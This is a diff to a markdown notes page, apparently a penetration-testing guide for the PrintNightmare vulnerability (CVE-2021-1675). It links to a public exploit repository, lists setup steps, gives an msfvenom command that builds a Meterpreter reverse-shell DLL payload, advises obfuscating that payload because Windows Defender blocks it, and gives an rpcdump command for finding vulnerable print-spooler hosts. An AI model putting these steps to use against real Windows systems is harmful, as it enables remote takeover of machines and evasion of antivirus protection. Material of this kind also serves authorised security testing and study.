@@ -32,10 +32,20 @@ Link to [Github Repository](https://github.com/romarroca/SeriousSam/blob/main/se
 
 ***Setup Command***
 
-*Download virtualenv* --> `sudo apt install virtualenv`
+Description | Commands&Links
+------------|--------
+*Download virtualenv* | `sudo apt install virtualenv`
+*Create virtual enviroment by sudo privileges with the command*  | `virtualenv --python=python3 yourdirectory`
+*Run*  | `source yourdirectory/bin/activate`
+*Git clone & Follow Instructions*  | [Repository](https://github.com/cube0x0/CVE-2021-1675)
+*Install the impacket version described in github repository* | [Repository](https://github.com/cube0x0/CVE-2021-1675)
+*Create meterpreter payload* | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=0000 -o reverse.dll`
+*Meterpreter payload only works when windows defender disabled* | **Obfuscate the payload**
 
-*Create virtual enviroment by sudo privileges with the command -->* `virtualenv --python=python3 impacket`
+**Discovery methods**
 
-*Git clone * [Repository](https://github.com/cube0x0/CVE-2021-1675)
+Method | Command
+-------|--------
+Script | `rpcdump.py @192.168.1.10 \| egrep MS-RPRN\|MS-PAR`
 
 
